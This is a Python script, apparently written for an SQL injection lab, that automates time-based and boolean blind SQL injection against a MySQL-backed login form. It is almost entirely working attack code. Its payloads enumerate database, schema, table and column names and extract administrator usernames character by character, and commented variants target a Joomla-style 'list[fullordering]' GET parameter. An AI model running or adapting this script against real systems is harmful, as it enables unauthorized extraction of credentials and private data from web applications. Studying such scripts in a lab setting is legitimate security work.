#!/bin/env python3
# -*- coding: utf-8 -*-
"""
Script to automate blind SQL injection on MySQL database (SQL Injection Lab 20220621
"""

import requests
import string 
import time
import sys
import urllib.parse

url = 'http://172.23.26.27/'

proxies = { 'http': 'http://127.0.0.1:8080', }


def injectsql():
    """Function: Perform SQL injection on user form"""
    session = requests.Session()
    fullstart= time.time()
    l = 1
    flag = ''
    prev_flag = ''
    # Iterate through length of username
    while l <= 1024:
        # For each character compare values to find match
        for c in range(32,128):
            start = time.time()
            headers= {'Content-Type': 'application/x-www-form-urlencoded'}
            ### PAYLOADS TIME-BASED ###
            #payload= {'login':f"'+or+(select+case+when+(ascii(substr(database(),{l},1))={c})+then+sleep(3)+else+'0'+end)--'",'passwd':'test'} #retrieving database name
            #payload= {'login':f"'+or+(select+case+when+(ascii(substr(schema_name,{l},1))={c})+then+sleep(3)+else+'0'+end+from+information_schema.schemata+limit+1+offset+{sys.argv[1]})--'",'passwd':'test'} #retrieving databases name
            #payload= {'login':f"'+or+(select+case+when+(ascii(substr(table_name,{l},1))={c})+then+sleep(3)+else+'0'+end+from+information_schema.tables+WHERE+TABLE_SCHEMA='mysql_admin_cred'+limit+1+offset+{sys.argv[1]})--'",'passwd':'test'} #retrieving table name current base database()
            #payload= {'login':f"'+or+(select+case+when+(ascii(substr(column_name,{l},1))={c})+then+sleep(3)+else+'0'+end+from+information_schema.columns+where+table_name='passwords'+limit+1+offset+{sys.argv[1]})--'",'passwd':'test'} #retrieving column name
            payload= {'login':f"'+or+(select+case+when+(ascii(substr(user,{l},1))={c})+then+sleep(3)+else+'0'+end+from+mysql_admin_cred.admin+limit+1+offset+{sys.argv[1]})--'",'passwd':'test'} #retrieving data fromt cell DB_name.TABLE_name
            ### PAYLOAD BLIND ###
            payload_str = urllib.parse.urlencode(payload, safe=':+()\'={},') #payload_str = "&".join("%s=%s" % (k,v) for k,v in payload.items()) #another option url encoding filtering
            #request = session.post(url,headers=headers, data=payload_str, proxies=proxies) #proxie for debug
            #### POST REQUEST ####
            request = session.post(url,headers=headers, data=payload_str)
            #request = session.post(url, data={'check':f"' or (select case when (ascii(substr(phone,{l},1))='{c}') then 1 else 0 end from phones limit 1 offset {sys.argv[1]})--'"}, proxies=proxies)
            #request = session.post(url, data=payload_str, proxies=proxies) #debug proxie
            #### POST REQUEST ENDS ####
            #### GET REQUEST ####
            #uri=url+f"?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT%20*%20FROM%20(SELECT(if(Ascii(substring((Select%20database()),{l},1))={c}, sleep(3),0)))GDiu)" # get database name
            #uri=url+f"?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT%20*%20FROM%20(SELECT(SELECT%20CASE%20WHEN(Ascii(substring((Select%20TABLE_NAME),{l},1))={c})then%20sleep(3)%20else%20'0'%20end%20from+information_schema.tables+limit+1+offset+{sys.argv[1]})))GDiu)"
            ##request = session.get(uri, proxies=proxies) #debug proxie
            #request = session.get(uri)
            #### GET REQUEST ENDS ####
            end = time.time() 
            response = request.text
            # Found a match
            if 'consideration' in response: #searching text in response
                flag = flag + chr(c)
                break
            if ((end - start) > 3): #time-based delay right charecter determination
                flag = flag + chr(c)
                break
            if c==127:
                l = 1025
                break
        l+=1
        print(flag)
    print('String: ', flag)
    fullend = time.time()
    rt = fullend - fullstart
    print('Response time: ', rt )

injectsql()
